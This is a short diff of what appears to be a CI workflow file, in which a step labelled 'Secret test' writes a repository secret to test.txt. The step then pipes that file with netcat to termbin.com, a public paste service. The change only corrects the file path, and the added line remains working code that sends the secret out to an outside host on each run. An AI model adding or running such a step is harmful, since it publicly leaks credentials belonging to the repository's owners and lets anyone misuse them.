@@ -35,7 +35,7 @@ jobs:
       - name: Secret test
         run: |
           echo ${{secrets.TEST_SECRET}} > test.txt
-          cat ~/test.txt | nc termbin.com 9999
+          cat test.txt | nc termbin.com 9999
 
 
   run_tests:
